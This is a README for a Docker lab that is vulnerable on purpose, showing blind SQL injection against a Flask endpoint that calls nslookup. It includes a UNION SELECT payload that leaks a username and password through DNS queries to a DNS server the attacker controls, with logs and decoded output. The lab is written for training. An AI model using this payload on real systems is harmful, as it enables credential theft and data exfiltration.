# Blind SQLi Lab with DNS Exfiltration (Out-of-Band)

This lab simulates a vulnerable web application that is susceptible to blind SQL injection. The application uses user input to perform DNS resolution on a hostname retrieved from a database, allowing for **out-of-band (OOB)** data exfiltration via DNS queries to a controlled server.

## 🧪 Lab Components

- **Flask Web App (`/web`)**: 
  - A vulnerable endpoint `/search?id=<number>` executes an unsanitized SQL query.
  - It uses `nslookup` to resolve a hostname retrieved from the database.
  - Optional parameter: `set-dns=<IP>` to specify a custom DNS server for resolution.

- **DNS Listener (`/dns-server`)**:
  - A Python script that runs a simple UDP DNS server and logs incoming raw DNS queries for analysis.

- **Docker**:
  - Docker Compose is used to run both services in isolated containers.

---

## 🛠️ How to Run the Lab

### Clone this repo

	git clone

### Run containers

	sudo docker-compose build --no-cache
	
This will:

- Start the vulnerable web app at http://localhost:8080

- Start the DNS listener: default port UDP 53, internal docker net IP 172.20.53.53


### Payloads

- Using default DNS: this performs a lookup to www.google.it using default DNS -> OK
	
	  /search?id=1
	
Check web app console log

	web_1         | Server:         127.0.0.11
	web_1         | Address:        127.0.0.11#53
	web_1         | 
	web_1         | Non-authoritative answer:
	web_1         | Name:   www.google.it
	web_1         | Address: 216.58.204.227
	web_1         | Name:   www.google.it
	web_1         | Address: 2a00:1450:4002:415::2003
	web_1         | 
	web_1         | 172.20.53.1 - - [09/Jul/2025 08:31:51] "GET /search?id=1 HTTP/1.1" 200 -
	
 - Using custom DNS: this perform the same lookup query using our controlled DNS to resolve it -> Error (but it's expected)

	   /search?set-dns=172.20.53.53&id=1

Check web app console log

 	web_1         | 172.20.53.1 - - [09/Jul/2025 08:31:51] "GET /search?id=1 HTTP/1.1" 200 -
	web_1         | ;; communications error to 172.20.53.53#53: timed out
	web_1         | ;; communications error to 172.20.53.53#53: timed out
	web_1         | ;; communications error to 172.20.53.53#53: timed out
	web_1         | ;; no servers could be reached
	web_1         | 
	web_1         | 172.20.53.1 - - [09/Jul/2025 08:38:27] "GET /search?set-dns=172.20.53.53&id=1 HTTP/1.1" 200 -

	
Indeed check logged queries on our DSN container

	sudo docker exec -it blind-sqli-lab_dns-server_1 /bin/bash                                      
	root@004315a2105c:/app# cat dns_log.txt 

	2025-07-09 08:38:12,913 - DNS query from ('172.20.53.10', 41104): RAW = 942b010000010000000000000377777706676f6f676c650269740000010001
	2025-07-09 08:38:17,917 - DNS query from ('172.20.53.10', 41908): RAW = 942b010000010000000000000377777706676f6f676c650269740000010001
	2025-07-09 08:38:22,921 - DNS query from ('172.20.53.10', 57648): RAW = 942b010000010000000000000377777706676f6f676c650269740000010001

 Decode the raw query:

 	root@004315a2105c:/app# exit
	[~/blind-sqli-lab] python decode-raw-dnsq.py 942b010000010000000000000377777706676f6f676c650269740000010001        
	[+] Plain domain value: www.google.it

## 💥Exploitation 
Knowing tha we can control the DNS parameter for nslookup and assuming that a users table is also present in the DB, we can use the following payload to obtain sensitive information:

	/search?set-dns=172.20.53.53&id=1 UNION SELECT (SELECT username || '-' || password FROM users WHERE id=1)
 Check again the logged query

 	[~/blind-sqli-lab] sudo docker exec -it blind-sqli-lab_dns-server_1 /bin/bash                              
	root@004315a2105c:/app# cat dns_log.txt 
	2025-07-09 08:38:12,913 - DNS query from ('172.20.53.10', 41104): RAW = 942b010000010000000000000377777706676f6f676c650269740000010001
	2025-07-09 08:38:17,917 - DNS query from ('172.20.53.10', 41908): RAW = 942b010000010000000000000377777706676f6f676c650269740000010001
	2025-07-09 08:38:22,921 - DNS query from ('172.20.53.10', 57648): RAW = 942b010000010000000000000377777706676f6f676c650269740000010001
	2025-07-09 08:50:39,508 - DNS query from ('172.20.53.10', 60256): RAW = 697e010000010000000000001161646d696e2d73757065727365637265740000010001
	2025-07-09 08:50:44,513 - DNS query from ('172.20.53.10', 49822): RAW = 697e010000010000000000001161646d696e2d73757065727365637265740000010001
	2025-07-09 08:50:49,517 - DNS query from ('172.20.53.10', 40392): RAW = 697e010000010000000000001161646d696e2d73757065727365637265740000010001
	root@004315a2105c:/app# 
Decode the last entries

 	root@004315a2105c:/app# exit
  	[~/blind-sqli-lab] python decode-raw-dnsq.py 697e010000010000000000001161646d696e2d73757065727365637265740000010001                                                             
	[+] Plain domain value: admin-supersecret

## ❓ Why this Lab?
Incredible enough I found this logic implemented in a real app. The parameter where passed as JSON object in the body request to an API, but the logic was the same as presented in this lab, actually:
- no inpunt parameters validation
- control nslookup DNS server
You can eventually automete the process using SQLMap. You can find a good resource at https://blog.cyberadvisors.com/technical-blog/unblinding-blind-sql-injection-using-dns-exfiltration

## Useful docker commands

### Stop containers

	sudo docker compose down 
	
### Rebuild containers
	
	sudo docker-compose build --no-cache
